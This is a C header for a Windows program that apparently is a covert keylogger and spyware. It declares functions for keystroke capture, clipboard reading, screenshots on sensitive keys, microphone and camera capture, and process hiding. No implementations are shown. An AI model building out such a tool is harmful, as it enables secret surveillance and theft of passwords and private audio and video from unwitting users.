#ifndef WINKEY_H
#define WINKEY_H

#include <mmdeviceapi.h>
#include <audioclient.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <processthreadsapi.h>
#include <initguid.h> 
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <sddl.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
//#pragma comment(linker, "/ENTRY:mainCRTStartup")

#ifdef __cplusplus
extern "C" 
{
#endif
extern volatile int g_micro_run;
#ifdef __cplusplus
}
#endif

int vk_to_char(DWORD vkCode, char *out);
void get_time(char *buf);
char *special_touch(DWORD vk);
void get_window_title(char *title);

void hide_process(wchar_t *new_name);
int capture_screen(LPCWSTR path);
void on_special_event(void);
void screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
int allow_app(char *exe, DWORD pid);
void read_clipboard(char *buffer, size_t size);
int is_sensitive_key(DWORD vk);

int capture_micro(void);
int start_camera(void);


#endif